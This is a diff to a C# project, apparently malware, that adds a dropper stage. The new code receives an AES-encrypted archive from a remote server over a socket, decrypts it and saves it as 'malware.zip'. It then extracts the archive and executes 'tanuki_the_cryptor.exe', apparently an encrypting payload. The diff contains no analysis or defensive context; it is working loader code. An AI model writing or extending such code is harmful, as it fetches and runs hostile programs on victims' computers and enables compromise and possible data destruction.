@@ -10,6 +10,7 @@ using System.Numerics;
 using System.Security.Cryptography;
 using System.Collections.Generic;
 using System.Runtime.InteropServices.ComTypes;
+using System.IO.Compression;
 
 namespace tanuki_the_first
 {
@@ -73,15 +74,35 @@ namespace tanuki_the_first
                 
                 Console.WriteLine("AES Key hex: " + ByteArrayToString(this.aes_key.ToByteArray()));
 
-                byte[] binary_data;
-                //(binary_data, bytesRead) = comm.RecvBinary(58_901_174);
-                (binary_data, bytesRead) = comm.RecvBinary(4096);
-                binary_data = Cryptography.AESDecrypt(binary_data, aes_key.ToByteArray());
+                byte[] hash_bytes = null;
+                (hash_bytes, bytesRead) = comm.RecvMessage(4096);
 
-                using (FileStream file = new FileStream("malware.txt", FileMode.Create, FileAccess.Write))
+                string hash = Encoding.ASCII.GetString(hash_bytes, 0, bytesRead);
+                hash = hash.Replace("'", "\"");
+                Console.WriteLine("Received: " + hash);
+
+                Packets.Reply.ExeSend resp = JsonSerializer.Deserialize<Packets.Reply.ExeSend>(hash);
+
+
+                //---------------------------------//
+
+                byte[] binary_data;
+                (binary_data, bytesRead) = comm.RecvBinary(158_901_184);
+                
+                byte[] zip = new byte[bytesRead];
+                Array.Copy(binary_data, zip, bytesRead);
+                Console.WriteLine("Received byte len: " + zip.Length);
+
+                binary_data = Cryptography.AESDecrypt(zip, aes_key.ToByteArray());
+
+                using (FileStream file = new FileStream("malware.zip", FileMode.Create, FileAccess.Write))
                 {
                     file.Write(binary_data, 0, bytesRead);
                 }
+
+                ZipFile.ExtractToDirectory("malware.zip", ".\\");
+
+                Exec.ExecProgram(".\\malware\\tanuki_the_cryptor.exe");
 
                 Console.WriteLine("Binary file received and saved.");
             }
